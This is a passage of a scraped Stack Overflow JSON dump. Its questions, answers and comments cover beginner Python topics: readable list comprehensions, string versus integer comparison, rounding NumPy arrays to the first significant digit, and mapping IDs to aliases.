print(var)\nHello\n&gt;&gt;&gt;\n</code></pre>\n\n<p><strong>Question</strong>: Is there a way to have an executable module (or package) providing the same functionality? <em>I.e.</em>, some way to run the interpreter <em>with</em> the definitions previously done in the module (or package).</p>\n\n<p>Edit:</p>\n\n<ul>\n<li>By <em>executable module</em> I mean a simple executable file:</li>\n</ul>\n\n<pre><code>$ chmod +x mod.py\n$ ./mod.py\n&gt;&gt;&gt; print(var)\nHi\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "python-2.7", "list", "list-comprehension"], "comments": [{"owner": {"reputation": 25081, "user_id": 4804629, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vGzEm.jpg?s=128&g=1", "display_name": "splash58", "link": "https://stackoverflow.com/users/4804629/splash58"}, "edited": false, "score": 3, "creation_date": 1571865646, "post_id": 58531126, "comment_id": 103386078, "body": "What a problem to write usual loops?"}, {"owner": {"reputation": 4469, "user_id": 6342812, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/19e9e8f53f02cc9013f635a6bb67647d?s=128&d=identicon&r=PG&f=1", "display_name": "rassar", "link": "https://stackoverflow.com/users/6342812/rassar"}, "edited": false, "score": 1, "creation_date": 1571865701, "post_id": 58531126, "comment_id": 103386100, "body": "Try putting <code>v == number[i]</code> instead of <code>True if v == number[i] else False</code>"}, {"owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 2, "creation_date": 1571865845, "post_id": 58531126, "comment_id": 103386134, "body": "you can use <code>index</code> and <code>value</code> instead of <code>i</code> and <code>v</code> to make it more explicit (other letters too)"}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "reply_to_user": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "edited": false, "score": 2, "creation_date": 1571866110, "post_id": 58531126, "comment_id": 103386221, "body": "Beginners do <i>not</i> understand &quot;pythonic&quot; in-place list creation loops.  It can be seen often on SO - someone answers a python question with a cryptic in-place list creation, then the OP responds. &quot;Huh?!&quot;.  Create the lists long-hand.  Also as @OferSadan points out, use more meaningful variable names - <code>i</code> for a numeric iterator is fine, but <code>v</code>, <code>g</code> and <code>n</code> aren&#39;t.  Where are the code comments too?"}, {"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "reply_to_user": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 1, "creation_date": 1571866757, "post_id": 58531126, "comment_id": 103386423, "body": "@Kingsley I will add, people often mistakenly think turning everything into a <i>list comprehension</i> is what pythonic means, but that is not true. If something is unreadable, it isn&#39;t pythonic! That is one of the core values in python! Readability counts! now, simple mapping/filtering operations are <i>often</i> pythonically expressed as list comprehensions, but if it becomes unwieldy, then the entire purpose of that language construct is subverted."}, {"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 0, "creation_date": 1571867374, "post_id": 58531126, "comment_id": 103386613, "body": "this is a better fit for <a href=\"https://codereview.stackexchange.com\">Code Review</a>. In any case, there are many improvements you could make here. Use <code>zip</code> to iterate over two sequences in corresponding pairs, don&#39;t use indices (see answer below). craft your boolean expressions idiomatically, <code>True if something == something_else else False</code> is a wordy way of saying <code>something == something_else</code>. And, the simplest bust most effective: use more meaningful variable names, and factor out common logic into functions with meaningful names."}, {"owner": {"reputation": 7441, "user_id": 1575353, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/rvz3i.png?s=128&g=1", "display_name": "S\u1d00\u1d0d On\u1d07\u1d0c\u1d00", "link": "https://stackoverflow.com/users/1575353/s%e1%b4%80%e1%b4%8d-on%e1%b4%87%e1%b4%8c%e1%b4%80"}, "edited": false, "score": 0, "creation_date": 1571868752, "post_id": 58531126, "comment_id": 103387009, "body": "if you post on Code Review please read the help center pages like <a href=\"https://codereview.stackexchange.com/help/how-to-ask\"><i>How do I ask a good question?</i></a> - in its current form this post would be considered off-topic because there is little context about what the code does and how the function is used, plus the title is about CR goals instead of describing what the code does"}], "answers": [{"comments": [{"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 0, "creation_date": 1571866945, "post_id": 58531350, "comment_id": 103386471, "body": "<code>g, n = zip(*[...])</code> is cute, but very cryptic. I do not consider it an improvement. However, using <code>zip</code> to iterate over two in corresponding pairs <i>is</i> good."}, {"owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "reply_to_user": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 0, "creation_date": 1571867161, "post_id": 58531350, "comment_id": 103386544, "body": "@juanpa.arrivillaga That&#39;s true, so maybe better to stay with the two separate comprehensions :-) Once you recognize that <code>zip(*[...])</code> basically transposes the given sequence, it becomes a bit clearer (in some cases at least). I use it for that purpose from time to time, but together with a comprehension it seems a bit heavy. But <code>transposed = zip(*sequence)</code> is readable I find."}, {"owner": {"reputation": 63658, "user_id": 5014455, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JTknr.png?s=128&g=1", "display_name": "juanpa.arrivillaga", "link": "https://stackoverflow.com/users/5014455/juanpa-arrivillaga"}, "edited": false, "score": 2, "creation_date": 1571867332, "post_id": 58531350, "comment_id": 103386599, "body": "Look, my criteria is &quot;if a competent programmer in another language who isn&#39;t very familiar with python will have a hard time understanding it, it is&#39;t readable&quot;. sure, you can argue there are certain idioms that become common to a language, I&#39;m just not sure <code>transposed = zip(*sequence)</code> is one of them. I think this is a great example of how this question is too opinion-based, honestly, it is a better fit for CodeReview"}], "tags": [], "owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "is_accepted": false, "score": 2, "last_activity_date": 1571866876, "creation_date": 1571866876, "answer_id": 58531350, "question_id": 58531126, "link": "https://stackoverflow.com/questions/58531126/how-to-make-list-comprehensions-more-readable/58531350#58531350", "title": "How to make list comprehensions more readable?", "body": "<p>Here are a few improvements:</p>\n\n<ul>\n<li><code>True if x else False</code> is simply <code>bool(x)</code> or, as you are doing a comparison already, just that expression, i.e. <code>v == number[i]</code>.</li>\n<li>Since you are accessing the number by positional index you can just <code>zip</code> the two sequences.</li>\n</ul>\n\n<p>So for the first you'd get:</p>\n\n<pre><code>correct_places = [x == y for x, y in zip(userGuess, number)]\n</code></pre>\n\n<p>The same argument with <code>zip</code> applies to the following two comprehensions (you can again iterate over the original string):</p>\n\n<pre><code>g = [x for x, y in zip(userGuess, number) if x != y]\nn = [y for x, y in zip(userGuess, number) if x != y]\n</code></pre>\n\n<p>Given that this is basically the same comprehension two times, and that we don't need <code>correct_places</code> anymore we can instead do the following:</p>\n\n<pre><code>g, n = zip(*[(x, y) for x, y in zip(userGuess, number) if x != y])\n</code></pre>\n\n<p>Then you can <code>sum</code> instead of <code>len</code>:</p>\n\n<pre><code>return sum(x in n for x in g)\n</code></pre>\n\n<p>So basically you can use the following code:</p>\n\n<pre><code>g, n  = zip(*(xy for xy in zip(userGuess, num) if xy[0] != xy[1])\nreturn sum(x in n for x in g)\n</code></pre>\n"}], "owner": {"reputation": 55, "user_id": 12145313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KEz6Z.jpg?s=128&g=1", "display_name": "Pro-Grammer", "link": "https://stackoverflow.com/users/12145313/pro-grammer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1571866876, "creation_date": 1571865556, "question_id": 58531126, "link": "https://stackoverflow.com/questions/58531126/how-to-make-list-comprehensions-more-readable", "title": "How to make list comprehensions more readable?", "body": "<p>I have this bit of code below, and i think it's kinda hard to understand if you are new to python.</p>\n\n<p>How would i go about making it more readable to a group of newcomers to python (students)</p>\n\n<pre><code>def right_inwrongplace(userGuess, number):\n    correct_places = [True if v == number[i] else False for i, v in enumerate(userGuess)]\n    g = [v for  i, v in enumerate(userGuess) if not correct_places[i]]\n    n = [v for  i, v in enumerate(number) if not correct_places[i]]\n    return len([i for i in g if i in n])\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "bag"], "comments": [{"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 5, "creation_date": 1571865565, "post_id": 58531100, "comment_id": 103386051, "body": "&quot;5&quot; is greater than &quot;10&quot; in a string comparison."}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 2, "creation_date": 1571865994, "post_id": 58531100, "comment_id": 103386182, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/20449427/how-can-i-read-inputs-as-numbers\">How can I read inputs as numbers?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 8368, "user_id": 4669778, "user_type": "registered", "accept_rate": 86, "profile_image": "https://lh4.googleusercontent.com/-Iz_f3T23jC4/AAAAAAAAAAI/AAAAAAAADVQ/_H_y2EUoF7c/photo.jpg?sz=128", "display_name": "Ofer Sadan", "link": "https://stackoverflow.com/users/4669778/ofer-sadan"}, "is_accepted": true, "score": 2, "last_activity_date": 1571865646, "creation_date": 1571865646, "answer_id": 58531143, "question_id": 58531100, "link": "https://stackoverflow.com/questions/58531100/why-5-is-greater-than-10-python/58531143#58531143", "title": "Why 5 is greater than 10 python?", "body": "<p>in python all that's returned from <code>input</code> are strings, and they are still strings even after you use <code>split()</code> on them. <code>'5'</code> (the string) is larger than <code>'10'</code> (the string) because string comparison works on the first letter first!</p>\n\n<p>To do it properly, convert them both to <code>int</code>:</p>\n\n<pre><code>while True:\n    x = input().split()\n    if len(x) != 2:\n        continue\n    a, b = x\n    if int(a) &gt; int(b):\n        print(a, 'is greater than', b)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2389, "user_id": 7348030, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7PmbNFJwfPc/AAAAAAAAAAI/AAAAAAAAAJE/5lDuTFQtNpQ/photo.jpg?sz=128", "display_name": "Florian Bernard", "link": "https://stackoverflow.com/users/7348030/florian-bernard"}, "is_accepted": false, "score": 0, "last_activity_date": 1571865666, "creation_date": 1571865666, "answer_id": 58531146, "question_id": 58531100, "link": "https://stackoverflow.com/questions/58531100/why-5-is-greater-than-10-python/58531146#58531146", "title": "Why 5 is greater than 10 python?", "body": "<p>In string comparison, do this instead.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>x = list(map(int, input().split()))\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 12246273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d9dc8c3ed1d5b531eaab29118de2dcc?s=128&d=identicon&r=PG&f=1", "display_name": "Michaelan", "link": "https://stackoverflow.com/users/12246273/michaelan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 391, "favorite_count": 0, "accepted_answer_id": 58531143, "answer_count": 2, "score": 0, "last_activity_date": 1571866550, "creation_date": 1571865420, "last_edit_date": 1571866550, "question_id": 58531100, "link": "https://stackoverflow.com/questions/58531100/why-5-is-greater-than-10-python", "title": "Why 5 is greater than 10 python?", "body": "<pre><code>while True:\n    x = input().split()\n    if len(x) != 2:\n        continue\n    a, b = x\n    if a &gt; b:\n        print(a, 'is greater than', b)\n</code></pre>\n\n<p>Hi, why when i input: '5 10', output: '5 is greater than 10'?</p>\n"}, {"tags": ["python", "arrays", "numpy", "rounding"], "comments": [{"owner": {"reputation": 4896, "user_id": 4989451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e0682e2ca3e22ad90882c4993533462?s=128&d=identicon&r=PG&f=1", "display_name": "tstanisl", "link": "https://stackoverflow.com/users/4989451/tstanisl"}, "edited": false, "score": 0, "creation_date": 1571866319, "post_id": 58531091, "comment_id": 103386294, "body": "Use numpy.around"}, {"owner": {"reputation": 63, "user_id": 11389475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/201348ed031867aaf8c61a153e747c63?s=128&d=identicon&r=PG&f=1", "display_name": "DiMa", "link": "https://stackoverflow.com/users/11389475/dima"}, "reply_to_user": {"reputation": 4896, "user_id": 4989451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e0682e2ca3e22ad90882c4993533462?s=128&d=identicon&r=PG&f=1", "display_name": "tstanisl", "link": "https://stackoverflow.com/users/4989451/tstanisl"}, "edited": false, "score": 0, "creation_date": 1571866689, "post_id": 58531091, "comment_id": 103386403, "body": "in numpy around does not work properly because the when I set the values numpy.around(a, decimals=0)  the numbers 0.0019 , 0.025 , 0.00017 etc they become all 0 instead of 0.001, 0.02, 0.0001"}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571870058, "post_id": 58531091, "comment_id": 103387324, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/18915378/rounding-to-significant-figures-in-numpy\">Rounding to significant figures in numpy</a>"}], "answers": [{"comments": [{"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571869044, "post_id": 58531308, "comment_id": 103387070, "body": "Would this be faster / numerically more stable than just computing the logarithm?"}, {"owner": {"reputation": 47088, "user_id": 7207392, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dadc9567dde5f02b09a29695eca1ce40?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Panzer", "link": "https://stackoverflow.com/users/7207392/paul-panzer"}, "reply_to_user": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 1, "creation_date": 1571869940, "post_id": 58531308, "comment_id": 103387296, "body": "@norok2 Depends on problem size. The logspace has to be computed only once and since it has only a handful of entries the searchsorted is certainly faster than taking the log and power. You could even push it further and instead of the logspace 10^-10, 10^-9, 10^-8, use all possible outcomes ,i.e. xpo10 = 1 x 10^-10, 2 x 10^-10, 3 x 10^-10, ... 9 x 10^-10, 1 x  10^-9, 2 x 10^-9, etc. That is still a very manageable number of terms and we wouldn&#39;t have to do any arithmetic anymore just <code>xpo10[xpo10.searchsorted(a)-1]</code>"}], "tags": [], "owner": {"reputation": 47088, "user_id": 7207392, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dadc9567dde5f02b09a29695eca1ce40?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Panzer", "link": "https://stackoverflow.com/users/7207392/paul-panzer"}, "is_accepted": false, "score": 1, "last_activity_date": 1571866623, "creation_date": 1571866623, "answer_id": 58531308, "question_id": 58531091, "link": "https://stackoverflow.com/questions/58531091/how-to-do-element-wise-rounding-of-numpy-array-to-first-non-zero-digit/58531308#58531308", "title": "How to do element-wise rounding of NumPy array to first non-zero digit?", "body": "<p>You could use <code>np.logspace</code> and <code>np.seachsorted</code> to determine the order of magnitude of each element and then floor divide and multiply back</p>\n\n<pre><code>po10 = np.logspace(-10,10,21)\noom = po10[po10.searchsorted(a)-1]\na//oom*oom\n# array([[1.e+00, 1.e+00, 2.e+00, 1.e-01],\n#        [1.e-03, 2.e-02, 1.e+00, 1.e-04],\n#        [1.e+00, 2.e-03, 2.e+00, 9.e+00],\n#        [1.e+00, 3.e+00, 1.e-02, 5.e-03]])\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 63, "user_id": 11389475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/201348ed031867aaf8c61a153e747c63?s=128&d=identicon&r=PG&f=1", "display_name": "DiMa", "link": "https://stackoverflow.com/users/11389475/dima"}, "edited": false, "score": 0, "creation_date": 1571867640, "post_id": 58531354, "comment_id": 103386695, "body": "Thanks! works very nice and simple. Is there a way to kind of generalize this procedure with numbers bigger than 10 , let&#39;s say if it&#39;s 12.32  , 15.78 , 121.34  to get out 12 , 15 , 121?"}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "edited": false, "score": 0, "creation_date": 1571868969, "post_id": 58531354, "comment_id": 103387051, "body": "Note that here <code>a</code> may not have non-positve values."}, {"owner": {"reputation": 2339, "user_id": 1102805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2de42f74b5509b8af4bd0f255d05fd94?s=128&d=identicon&r=PG", "display_name": "darcamo", "link": "https://stackoverflow.com/users/1102805/darcamo"}, "edited": false, "score": 0, "creation_date": 1571885493, "post_id": 58531354, "comment_id": 103390165, "body": "I have edited the answer with a section to make it work with numbers &gt;= 10."}], "tags": [], "owner": {"reputation": 2339, "user_id": 1102805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2de42f74b5509b8af4bd0f255d05fd94?s=128&d=identicon&r=PG", "display_name": "darcamo", "link": "https://stackoverflow.com/users/1102805/darcamo"}, "is_accepted": true, "score": 0, "last_activity_date": 1571885452, "last_edit_date": 1571885452, "creation_date": 1571866905, "answer_id": 58531354, "question_id": 58531091, "link": "https://stackoverflow.com/questions/58531091/how-to-do-element-wise-rounding-of-numpy-array-to-first-non-zero-digit/58531354#58531354", "title": "How to do element-wise rounding of NumPy array to first non-zero digit?", "body": "<p>First get the powers of 10 for each number in the array with</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>powers = np.floor(np.log10(a))\n</code></pre>\n\n<p>In your example this gives us</p>\n\n<pre><code>array([[ 0.,  0.,  0., -1.],\n       [-3., -2.,  0., -4.],\n       [ 0., -3.,  0.,  0.],\n       [ 0.,  0., -2., -3.]])\n\n</code></pre>\n\n<p>Now, if we divide the <code>i</code>-th element in the array by <code>10**power_i</code> we essentially move each number non-zero element in the array to the first position. Now we can simple take the floor to remove the other non-zero digits and then multiply the result by <code>10**power_i</code> to get back to the original scale.</p>\n\n<p>The complete solution is then only the code below</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>powers = np.floor(np.log10(a))\n10**powers * np.floor(a/10**powers)\n</code></pre>\n\n<h2>What about numbers greater than or equal to 10?</h2>\n\n<p>For this you can simply take <code>np.floor</code> of the original value in the array. We can do this easily with a mask. You can modify the answer as below</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>powers = np.floor(np.log10(a))\nresult = 10**powers * np.floor(a/10**powers)\n\nmask = a &gt;= 10\nresult[mask] = np.floor(a[mask])\n</code></pre>\n\n<p>You can also use a mask to avoid computing the powers and logarithm for numbers that will just be replaced later.</p>\n"}, {"comments": [{"owner": {"reputation": 47088, "user_id": 7207392, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dadc9567dde5f02b09a29695eca1ce40?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Panzer", "link": "https://stackoverflow.com/users/7207392/paul-panzer"}, "edited": false, "score": 0, "creation_date": 1571870672, "post_id": 58531594, "comment_id": 103387459, "body": "Small nitpick: OP says &quot;round&quot; but what they really do is truncate, i.e. always round down / towards zero."}, {"owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "reply_to_user": {"reputation": 47088, "user_id": 7207392, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/dadc9567dde5f02b09a29695eca1ce40?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Panzer", "link": "https://stackoverflow.com/users/7207392/paul-panzer"}, "edited": false, "score": 0, "creation_date": 1571870851, "post_id": 58531594, "comment_id": 103387504, "body": "@PaulPanzer Thanks for spotting this! Fixed."}], "tags": [], "owner": {"reputation": 18268, "user_id": 5218354, "user_type": "registered", "accept_rate": 57, "profile_image": "https://lh4.googleusercontent.com/-NEO9rZKeffY/AAAAAAAAAAI/AAAAAAAAAKc/9IttO1jUOr4/photo.jpg=k-s128", "display_name": "norok2", "link": "https://stackoverflow.com/users/5218354/norok2"}, "is_accepted": false, "score": 1, "last_activity_date": 1571870831, "last_edit_date": 1571870831, "creation_date": 1571868695, "answer_id": 58531594, "question_id": 58531091, "link": "https://stackoverflow.com/questions/58531091/how-to-do-element-wise-rounding-of-numpy-array-to-first-non-zero-digit/58531594#58531594", "title": "How to do element-wise rounding of NumPy array to first non-zero digit?", "body": "<p>What you would want to do is to keep a fixed number of <a href=\"https://en.wikipedia.org/wiki/Significant_figures\" rel=\"nofollow noreferrer\">significant figures</a>.</p>\n\n<p>This functionality is not integrated into NumPy.</p>\n\n<p>To get only the 1 significant figure, you could look into either <a href=\"https://stackoverflow.com/a/58531308/5218354\">@PaulPanzer</a> or <a href=\"https://stackoverflow.com/a/58531354/5218354\">@darcamo</a> answers (assuming that you only have positive values).</p>\n\n<p>If you want something that works a specified number of significant figures, you could use something like:</p>\n\n<pre><code>def significant_figures(arr, num=1):\n    # : compute the order of magnitude\n    order = np.zeros_like(arr)  \n    mask = arr != 0\n    order[mask] = np.floor(np.log10(np.abs(arr[mask])))\n    del mask  # free unused memory\n    # : compute the corresponding precision\n    prec = num - order - 1\n    return np.round(arr * 10.0 ** prec) / 10.0 ** prec\n\n\nprint(significant_figures(a, 1))\n# [[1.e+00 2.e+00 3.e+00 1.e-01]\n#  [2.e-03 2.e-02 2.e+00 2.e-04]\n#  [1.e+00 2.e-03 2.e+00 1.e+01]\n#  [2.e+00 3.e+00 1.e-02 5.e-03]]\n\nprint(significant_figures(a, 2))\n# [[1.2e+00 1.9e+00 2.7e+00 1.2e-01]\n#  [1.9e-03 2.5e-02 1.9e+00 1.7e-04]\n#  [1.5e+00 2.1e-03 2.3e+00 1.0e+01]\n#  [1.5e+00 3.3e+00 1.2e-02 5.0e-03]]\n</code></pre>\n\n<hr>\n\n<h1>EDIT</h1>\n\n<p>For truncated output use <code>np.floor()</code> instead of <code>np.round()</code> just before the <code>return</code>.</p>\n"}], "owner": {"reputation": 63, "user_id": 11389475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/201348ed031867aaf8c61a153e747c63?s=128&d=identicon&r=PG&f=1", "display_name": "DiMa", "link": "https://stackoverflow.com/users/11389475/dima"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 259, "favorite_count": 0, "accepted_answer_id": 58531354, "answer_count": 3, "score": 0, "last_activity_date": 1571885452, "creation_date": 1571865353, "last_edit_date": 1571868860, "question_id": 58531091, "link": "https://stackoverflow.com/questions/58531091/how-to-do-element-wise-rounding-of-numpy-array-to-first-non-zero-digit", "title": "How to do element-wise rounding of NumPy array to first non-zero digit?", "body": "<p>I would like to \"round\" (not exact a mathematical rounding) the elements of a numpy array in the following way:</p>\n\n<p>Given a numpy NxN or NxM 2D array with digit between 0.00001 to 9.99999 like </p>\n\n<pre><code> a=np.array([[1.232, 1.872,2.732,0.123],\n             [0.0019, 0.025, 1.854, 0.00017],\n             [1.457, 0.0021, 2.34 , 9.99],\n             [1.527, 3.3, 0.012 , 0.005]]\n    )\n</code></pre>\n\n<p>I would like basically to \"round\" this numpy array by selecting the first non-zero digit (irregardless of the digit that follows the first non-zero digit) of each element\ngiving the output:</p>\n\n<pre><code>output =np.array([[1.0, 1.0, 2.0, 0.1],\n                 [0.001, 0.02, 1.0, 0.0001],\n                 [1.0, 0.002, 2 , 9.0],\n                 [1, 3, 0.01 , 0.005]]\n        )\n</code></pre>\n\n<p>thanks for any help!</p>\n"}, {"tags": ["python"], "answers": [{"tags": [], "owner": {"reputation": 4856, "user_id": 3700626, "user_type": "registered", "accept_rate": 30, "profile_image": "https://i.stack.imgur.com/LGCnh.jpg?s=128&g=1", "display_name": "Lior Cohen", "link": "https://stackoverflow.com/users/3700626/lior-cohen"}, "is_accepted": false, "score": 0, "last_activity_date": 1571866367, "creation_date": 1571866367, "answer_id": 58531266, "question_id": 58531078, "link": "https://stackoverflow.com/questions/58531078/how-to-match-items-in-two-different-lists-and-create-a-new-list-based-on-the-mat/58531266#58531266", "title": "How to match items in two different lists and create a new list based on the matches in python?", "body": "<p>I believe this is what you want:</p>\n\n<pre><code>multiple_ids = ['abc', 'def', 'xyz', 'def', 'xyz']\nids_singular = ['abc','def','xyz']\nalias = ['a_abc','a_def', 'a_xyz']\n\nd = dict(zip(ids_singular, alias))\nresult = [d[item] for item in multiple_ids]\n\nprint(result)  $ -&gt; ['a_abc', 'a_def', 'a_xyz', 'a_def', 'a_xyz']\n</code></pre>\n"}], "owner": {"reputation": 131, "user_id": 5325947, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/476468850ad157f1f5016250c6852ed2?s=128&d=identicon&r=PG&f=1", "display_name": "airzinger1", "link": "https://stackoverflow.com/users/5325947/airzinger1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 154, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1571866367, "creation_date": 1571865264, "question_id": 58531078, "link": "https://stackoverflow.com/questions/58531078/how-to-match-items-in-two-different-lists-and-create-a-new-list-based-on-the-mat", "title": "How to match items in two different lists and create a new list based on the matches in python?", "body": "<p>I have a list in python called \"multiple_ids\" with a bunch of ids and I have another list called \"ids_singular\" as well as another list called \"alias\". </p>\n\n<p>\"ids_singular\" and \"alias\" are both the same size and the index of \"ids_singular\" corresponds to the index of \"alias\". What this means is that  say the third value in the  \"alias\"  list is another way to represent the third  value in \"ids_singular\" .</p>\n\n<p>The list \"miltiple_ids\"  is larger than the other two lists and includes all values in \"ids_singular', but there are duplicates as well. Every id in \"mutiple_ids\" can be found in \"ids_singular\".</p>\n\n<p>What I am looking to do is for code that will replace each item (id) in \"multiple_ids\" with the matching alias from the \"alias\" list based on the \"ids_singular\" list.</p>\n\n<p>I have tried a double for loop where I first iterate through all the \"multiple_ids\", then iterate through all the \"ids_singular\" and if they are a match , create a new list that has the alias for the id based on the same index of \"alias\" list. </p>\n\n<pre><code>for i in (multiple_ids):\n    for j in range(len(ids_singular)):\n        if i==ids_singular[j]:\n            new_multiple_ids.append(alias[j])\nprint(new_multiple_ids)\n</code></pre>\n\n<p>When I run this code, nothing happens</p>\n"}, {"tags": ["python", "flask"], "comments": [{"owner": {"reputation": 2841, "user_id": 1641381, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/crUHq.jpg?s=128&g=1", "display_name": "kevinsa5", "link": 